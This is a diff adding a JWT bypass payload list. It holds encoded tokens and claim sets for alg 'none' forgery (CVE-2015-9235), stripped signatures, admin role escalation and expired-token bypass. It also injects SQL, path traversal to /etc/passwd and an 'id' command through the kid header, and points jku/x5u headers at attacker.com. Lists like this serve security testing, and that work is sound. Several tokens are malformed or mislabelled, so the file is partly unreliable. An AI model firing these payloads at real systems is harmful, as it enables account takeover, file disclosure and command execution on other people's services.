@@ -1,0 +1,62 @@
+# JWT Bypass Payloads
+# These payloads test JWT vulnerabilities
+
+# Algorithm confusion - change to 'none'
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
+
+# Missing signature
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+# None algorithm with payload
+eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.
+
+# Null signature
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ
+
+# Algorithm confusion HS256 to RS256
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
+
+# Weak secret (try common secrets)
+# Use with HS256 and secrets like: secret, password, 123456, jwt_secret
+
+# Role manipulation payloads (encode these)
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"role":"admin"}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"isAdmin":true}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"admin":true}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"privilege":"admin"}
+{"sub":"user","role":"administrator","permissions":["read","write","delete"]}
+
+# Expired token bypass (modify exp claim)
+{"sub":"1234567890","name":"John Doe","exp":9999999999,"role":"admin"}
+
+# Missing expiration
+{"sub":"1234567890","name":"John Doe","role":"admin"}
+
+# Kid (Key ID) injection
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL3B1YmxpYy9rZXkifQ
+
+# SQL injection in kid header
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IicgT1IgJzEnPScxJy0tIn0
+
+# Path traversal in kid
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ
+
+# Command injection in kid
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleTsgaWQgOyJ9
+
+# JKU (JWK Set URL) header injection
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vandrcy5qc29uIn0
+
+# X5U (X.509 URL) header injection
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vY2VydC5wZW0ifQ
+
+# Blank password
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+# Empty string signature
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.""
+
+# CVE-2015-9235 - algorithm confusion None/none/NONE
+eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+eyJBTEciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
